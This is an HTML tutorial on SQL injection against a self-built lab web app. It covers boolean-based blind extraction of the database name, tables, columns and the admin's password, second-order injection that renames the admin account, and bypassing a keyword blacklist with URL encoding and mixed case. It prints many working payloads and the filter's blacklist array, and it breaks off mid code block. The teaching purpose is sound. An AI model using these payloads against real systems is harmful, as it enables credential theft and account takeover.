-<p>Always remember: SQLi like this happens because of <strong>poor input sanitization</strong> and <strong>unsafely constructed SQL queries</strong>. Use parameterized queries (prepared statements) to shut this down.</p>
-
-<h1 id="boolean-based-blind-sql-injection-sqli">Boolean-Based Blind SQL Injection (SQLi)</h1>
-<hr />
-
-<p>Boolean-Based SQL Injection is a form of <strong>blind injection</strong> where the attacker doesn’t see database output directly but instead infers it through differences in the application’s behavior. The application’s response is based on <strong>true/false conditions</strong>, allowing attackers to slowly extract data.</p>
-
-<p>For example, a page might respond with “user found” when a condition is true, and “no user found” when false. That boolean switch is what we exploit.</p>
-
-<hr />
-
-<h3 id="scenario">Scenario</h3>
-
-<p>Imagine a web app that checks if a username exists:</p>
-
-<ul>
-  <li>
-    <p>✅ <code class="language-plaintext highlighter-rouge">http://localhost:8080/user.php?id=admin</code> → Response: <strong>user found</strong></p>
-  </li>
-  <li>
-    <p>❌ <code class="language-plaintext highlighter-rouge">http://localhost:8080/user.php?id=admin123</code> → Response: <strong>no user found</strong></p>
-  </li>
-</ul>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*YH6CTN8OYgKsnLaPMMjPhg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*mSO5iQu8gQOl4Hwq-YLCwg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>This tells us that <code class="language-plaintext highlighter-rouge">admin</code> is a valid username. Now let’s exploit this vulnerability using SQL Injection techniques.</p>
-
-<hr />
-
-<h3 id="step-1-identifying-column-count-with-union-select">Step 1: Identifying Column Count with <code class="language-plaintext highlighter-rouge">UNION SELECT</code></h3>
-
-<p>To execute a <code class="language-plaintext highlighter-rouge">UNION</code>-based injection, we must match the number of columns in the original query. We incrementally test:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-
--   ❌ `admin123' UNION SELECT 'col1'-- -`
-
--   ❌ `admin123' UNION SELECT 'col1','col2'-- -`
-
--   ✅ `admin123' UNION SELECT 'col1','col2','col3'-- -`
-
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Ro3NT8z7UfqndfN4L1Z55Q.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>Once we see “user found”, the column count (3) is confirmed.</p>
-
-<hr />
-
-<h3 id="step-2-enumerating-the-database-name">Step 2: Enumerating the Database Name</h3>
-
-<p>You can extract the database name using the <code class="language-plaintext highlighter-rouge">database()</code> function:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-admin123' UNION SELECT database(), 'x', 'x'-- - 
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*lKF5355haB2CJi6qlMWQ4Q.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>But in a true blind context, we need to guess characters one-by-one using <code class="language-plaintext highlighter-rouge">SUBSTRING()</code>:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-admin123' UNION SELECT 'x', 'x', 'x' FROM dual WHERE SUBSTRING(database(),1,1)='b'-- - 
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*0rSJ32MTMbvUlGChliiwkg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>If the result is “user found”, then the first character is ‘b’.</p>
-
-<p>You continue checking each character position:</p>
-
-<p><code class="language-plaintext highlighter-rouge">SUBSTRING(database(), 1, 2) = 'bl'</code></p>
-
-<p><code class="language-plaintext highlighter-rouge">SUBSTRING(database(), 1, 3) = 'bli'</code></p>
-
-<p>Until you reach:</p>
-
-<p><code class="language-plaintext highlighter-rouge">SUBSTRING(database(), 1, 10) = 'blind_sqli'</code></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*kU0xgyiEpqt904-S9T8S8Q.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>Now we know the database is called <code class="language-plaintext highlighter-rouge">blind_sqli</code>.</p>
-
-<hr />
-
-<h3 id="step-3-enumerating-table-names">Step 3: Enumerating Table Names</h3>
-
-<p>We use <code class="language-plaintext highlighter-rouge">information_schema.tables</code> to get table names in this DB:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-admin123' UNION SELECT 'x','x','x' FROM information_schema.tables WHERE table_schema = 'blind_sqli' AND SUBSTRING(table_name,1,1)='u' LIMIT 0,1 -- - 
-</code></pre>
-</div>
-
-<p>Continue guessing until:</p>
-
-<p><code class="language-plaintext highlighter-rouge">SUBSTRING(table_name,1,5)='users'</code></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*a0r7lQJJkzmy76EUf2Td8w.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>Confirmed: The table is <code class="language-plaintext highlighter-rouge">users</code>.</p>
-
-<hr />
-
-<h3 id="step-4-enumerating-column-names">Step 4: Enumerating Column Names</h3>
-
-<p>We now use <code class="language-plaintext highlighter-rouge">information_schema.columns</code>:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-admin123' UNION SELECT 'x','x','x' FROM information_schema.columns WHERE table_schema = 'blind_sqli' AND table_name = 'users' AND SUBSTRING(column_name, 1, 1) = 'u' LIMIT 0, 1 -- - 
-</code></pre>
-</div>
-
-<p>Repeat until you find:</p>
-
-<p><code class="language-plaintext highlighter-rouge">SUBSTRING(column_name, 1, 8) = 'username'</code></p>
-
-<p><code class="language-plaintext highlighter-rouge">SUBSTRING(column_name, 1, 8) = 'password'</code></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*lyL7fBKOX2qtjAXrCzOCwA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*g33Y_aXEDHQ5TrT__57u0A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>Columns are: <code class="language-plaintext highlighter-rouge">username</code>, <code class="language-plaintext highlighter-rouge">password</code>.</p>
-
-<hr />
-
-<h3 id="step-5-enumerating-usernames-from-the-users-table">Step 5: Enumerating Usernames from the <code class="language-plaintext highlighter-rouge">users</code> Table</h3>
-
-<p>Now that you know the structure, time to exfil actual data:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-admin123' UNION SELECT 'x','x','x' FROM users WHERE SUBSTRING(username,1,1)='a' LIMIT 0,1 -- -
-</code></pre>
-</div>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-admin123' UNION SELECT 'x','x','x' FROM users WHERE SUBSTRING(username,1,1)='j' LIMIT 0,1 -- -
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:4800/format:webp/1*KkSEyWOPGjrXEvLA3YFFrA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>Keep testing until you identify the value:</p>
-
-<p><code class="language-plaintext highlighter-rouge">SUBSTRING(username, 1, 5) = 'admin'</code></p>
-
-<p>Confirmed user: <code class="language-plaintext highlighter-rouge">admin</code></p>
-
-<hr />
-
-<h3 id="step-6-enumerating-the-password">Step 6: Enumerating the Password</h3>
-
-<p>Same technique applies for <code class="language-plaintext highlighter-rouge">password</code> field:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-admin123' UNION SELECT 'x','x','x' FROM users WHERE SUBSTRING(password, 1, 3) = 'sup' LIMIT 0, 1 -- -
-</code></pre>
-</div>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-admin123' UNION SELECT 'x','x','x' FROM users WHERE SUBSTRING(password, 1, 11) = 'supersecret' LIMIT 0, 1 -- -
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:4800/format:webp/1*bNxBMnzgAWSV2UdQUtzj_A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>Confirmed password: <code class="language-plaintext highlighter-rouge">supersecret</code></p>
-
-<hr />
-
-<p>This process may seem slow, but it works even when there’s no error message or visible output only behavior changes. Boolean-based blind SQLi depends on:</p>
-
-<ul>
-  <li>
-    <p>Controlled injection point (like <code class="language-plaintext highlighter-rouge">id=</code> parameter)</p>
-  </li>
-  <li>
-    <p>Application responses that clearly reflect true vs false outcomes</p>
-  </li>
-  <li>
-    <p>Use of functions like <code class="language-plaintext highlighter-rouge">SUBSTRING()</code>, <code class="language-plaintext highlighter-rouge">database()</code>, <code class="language-plaintext highlighter-rouge">information_schema</code></p>
-  </li>
-</ul>
-
-<h1 id="understanding-second-order-sql-injection-the-silent-threat">Understanding Second-Order SQL Injection: The Silent Threat</h1>
-
-<p>When we think about SQL injection (SQLi), the classic image is of attackers injecting malicious SQL commands directly into input fields causing immediate havoc like data leaks or corruption. But not all SQL injections flash their danger right away. Enter <strong>Second-Order SQL Injection</strong> a stealthier, more insidious cousin in the SQLi family.</p>
-
-<h2 id="what-is-second-order-sql-injection">What is Second-Order SQL Injection?</h2>
-
-<p>Second-Order SQL Injection (sometimes called stored SQLi) happens when malicious user input is saved in the database <strong>without causing any immediate SQL errors or suspicious behavior</strong>. The attack payload remains dormant harmless at first glance because the data isn’t directly executed as SQL during initial insertion.</p>
-
-<p>The real danger emerges <strong>later</strong>, when this stored data is retrieved and used in another SQL query <strong>without proper sanitization</strong> or escaping. This delayed injection point is what makes second-order SQLi tricky to detect and remediate.</p>
-
-<p>In short:</p>
-
-<ul>
-  <li>
-    <p>The attacker injects <strong>malicious SQL code into the database via one part of the app.</strong></p>
-  </li>
-  <li>
-    <p>The injected payload is stored as normal data.</p>
-  </li>
-  <li>
-    <p>Later, when the app uses this stored data in another SQL query (the “second order”), <strong>the malicious payload executes</strong>, enabling attacks like privilege escalation, data tampering, or data leakage.</p>
-  </li>
-</ul>
-
-<hr />
-
-<h2 id="why-is-this-attack-hard-to-catch">Why Is This Attack Hard to Catch?</h2>
-
-<p>Standard input validation or sanitization techniques often focus on preventing immediate SQLi input that breaks queries right away. But second-order SQLi bypasses this because the initial input looks harmless, causing no errors during insertion.</p>
-
-<p>Detection systems monitoring input fields may see nothing wrong, and code reviewers might miss vulnerabilities in seemingly “safe” retrieval queries, assuming data in the database is clean.</p>
-
-<h2 id="real-world-scenario-our-vulnerable-web-app">Real-World Scenario: Our Vulnerable Web App</h2>
-
-<p>Let’s ground this in a practical example using the vulnerable PHP web app we built for training:</p>
-
-<p>In our scenario, we’re dealing with a vulnerable PHP web application that lets users log in and update their username.</p>
-
-<p>Let’s walk through the steps an attacker might take:</p>
-
-<hr />
-
-<h4 id="step-1-log-in-as-a-normal-user">Step 1: Log in as a Normal User</h4>
-
-<p>We start by logging in as a regular user in this case, <strong><code class="language-plaintext highlighter-rouge">user1</code></strong>.</p>
-
-<p>After logging in, we’re taken to the home page, which lists all users. We can also visit each user’s profile page including our own and the <strong>admin’s</strong>. So far, everything looks normal.</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Qf8ebr7i6c42SNywAoFfYw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*1_TXGfi0PRmEbkpWTNZS9w.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<hr />
-
-<h4 id="step-2-change-our-own-username">Step 2: Change Our Own Username</h4>
-
-<p>The app allows users to change <em>their own</em> usernames from the profile page. Let’s test this feature by updating <code class="language-plaintext highlighter-rouge">user1</code> to <code class="language-plaintext highlighter-rouge">user2</code>. We enter the new name in the input field and submit the form.</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*v0YzSQ1ZrmAfsADKQyzZ5A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*M-hUg0PE9dBIcv6sdLsbjw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*kFlt6r6rGD1R6YZxDXcaKw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-UPDATE users SET username='user2' WHERE username='user1'
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*ElV09tGe2iKTz0hFYmScQQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*eGct-GvoAioYjHONtsyGVQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>This query runs successfully because we are <code class="language-plaintext highlighter-rouge">user1</code> and we’re updating our own username. No issues here functionality works as expected.</p>
-
-<hr />
-
-<h4 id="step-3-what-happens-if-we-inject-sql">Step 3: What Happens if We Inject SQL?</h4>
-
-<p>Now, let’s try to abuse the update functionality by injecting raw SQL instead of a clean new username.</p>
-
-<p>We change our input to the following payload:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-hacked_admin' WHERE username='admin' -- - 
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*e1gXV3LqrIzfHo1Nch3o0Q.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*lIekUW0jDjwBpDe5zPQUXg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>Let’s break it down:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-UPDATE users SET username='hacked_admin' WHERE username='admin' -- -'
-</code></pre>
-</div>
-
-<p>Here’s what this does:</p>
-
-<ul>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">'hacked_admin'</code> is the <strong>new username</strong> we want to assign.</p>
-  </li>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">WHERE username='admin'</code> <strong>overrides the default condition</strong> (<code class="language-plaintext highlighter-rouge">WHERE username='user1'</code>) that restricts updates to the currently logged-in user.</p>
-  </li>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">-- -</code> is a SQL comment that tells the database to <strong>ignore the rest of the query</strong>, including any part added by the app logic (like the real username check).</p>
-  </li>
-</ul>
-
-<p>So instead of updating our own account, the query updates <strong>admin’s username</strong>, even though we shouldn’t have permission to do that.</p>
-
-<hr />
-
-<h4 id="step-4-check-the-results">Step 4: Check the Results</h4>
-
-<p>After submitting the payload, we return to the home page.</p>
-
-<p>Now, instead of <code class="language-plaintext highlighter-rouge">admin</code>, we see a user named <strong><code class="language-plaintext highlighter-rouge">hacked_admin</code></strong> in the user list. That’s confirmation the SQL injection worked we just used our own profile update form to silently overwrite the admin’s username.</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*b02wTuQ94Ad9eYuZPCy0dQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*XDeQAC5_7YScC1D8CtSb5Q.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>This is the perfect example of a <strong>second-order SQL injection</strong>:</p>
-
-<ul>
-  <li>
-    <p>The injection payload was stored as seemingly harmless input.</p>
-  </li>
-  <li>
-    <p>Later, it was executed as part of an SQL command, causing <strong>unexpected behavior</strong> and a <strong>privilege bypass</strong>.</p>
-  </li>
-</ul>
-
-<p>Now, if we want to demonstrate a proof of concept (PoC), we don’t actually want to change anyone’s username unless you’ve created a separate test account, modifying existing users would be out of scope. To safely showcase the vulnerability without affecting any data, we can use a payload that triggers a delay, such as:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-user1', username = 'user1' WHERE '1'='1' AND SLEEP(5) -- - 
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*q1xPV8WoWXbQSP_KQ230cw.gif" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>This payload executes the <code class="language-plaintext highlighter-rouge">SLEEP(5)</code> function to delay the response, confirming the SQL injection vulnerability without modifying any user data.</p>
-
-<h1 id="bypassing-sqli-filters-using-url-encoding-why-it-matters">Bypassing SQLi Filters Using URL Encoding: Why It Matters</h1>
-
-<p>Before we dive into bypass techniques, let’s break down <strong>why URL encoding is a key weapon</strong> in evading SQL injection (SQLi) protections.</p>
-
-<h3 id="what-is-url-encoding">What is URL Encoding?</h3>
-
-<p>URL encoding transforms special characters into a <code class="language-plaintext highlighter-rouge">%</code> sign followed by their ASCII hex value. For example, the classic payload:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-' OR 1=1--
-</code></pre>
-</div>
-
-<p>becomes:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-%27%20OR%201%3D1--%20
-</code></pre>
-</div>
-
-<p>This encoding masks the payload from naïve filters, letting it slip through initial checks because the web app might decode it <em>after</em> filtering, effectively bypassing string-matching rules.</p>
-
-<hr />
-
-<h3 id="the-challenge-filters-in-place">The Challenge: Filters in Place</h3>
-
-<p><strong>The Setup</strong>: Our Web App, Now With Filters
-Remember the vulnerable web app we worked on before? The one where SQLi was wide open?</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*loRhH_IjhqRpLyxwLm3pSA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<h3 id="this-time-showing-the-actual-query-for-clarity">This Time: Showing the Actual Query for Clarity</h3>
-
-<p>To help you see exactly how this works, I’m showing the generated SQL query when we update the username. For example, if we change the user’s name from <code class="language-plaintext highlighter-rouge">user2</code> to <code class="language-plaintext highlighter-rouge">user3</code>, the app sends:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-UPDATE users SET name = 'user3' WHERE username = 'randomuser'
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*KoRFw5GECJl1xxetKcpQ0w.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>This confirms how the input is incorporated into the SQL statement, which helps us craft payloads that manipulate this structure.</p>
-
-<p>This time, it’s got a basic blacklist filter in place, designed to block dangerous keywords and characters like:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-// Case-sensitive blacklist filter
-$special_chars = array(
-    "OR", "or", "AND", "and", "UNION", "SELECT", "WHERE", "'",
-    " ",    // space
-    "\t",   // tab
-    "\n",   // newline
-    "\r",   // carriage return
-    "\0",   // null byte
-);
-</code></pre>
-</div>
-
-<p>Trying to send the same payload:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-hacked_admin' WHERE username='admin' -- - 
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*H-t2oNkVExGAJFEq9uy4Ug.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>gets blocked outright because it contains filtered keywords like <code class="language-plaintext highlighter-rouge">WHERE</code>, spaces <code class="language-plaintext highlighter-rouge">‎ </code>, and single quotes <code class="language-plaintext highlighter-rouge">'</code>.</p>
-
-<hr />
-
-<h3 id="heres-where-url-encoding-steps-up">Here’s Where URL Encoding Steps Up</h3>
-
-<ul>
-  <li>
-    <p><strong>Spaces:</strong> blocked as literal spaces, but <code class="language-plaintext highlighter-rouge">%20</code> flies under the radar.</p>
-  </li>
-  <li>
-    <p><strong>Keywords like <code class="language-plaintext highlighter-rouge">WHERE</code>:</strong> filtered in exact case, but case-sensitive, so <code class="language-plaintext highlighter-rouge">wHeRe</code> or <code class="language-plaintext highlighter-rouge">WhErE</code> can bypass.</p>
-  </li>
-  <li>
-    <p><strong>Single quotes <code class="language-plaintext highlighter-rouge">'</code>:</strong> encoded as <code class="language-plaintext highlighter-rouge">%27</code>.</p>
-  </li>
-</ul>
-
-<p>Rebuilding our payload with these tricks:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
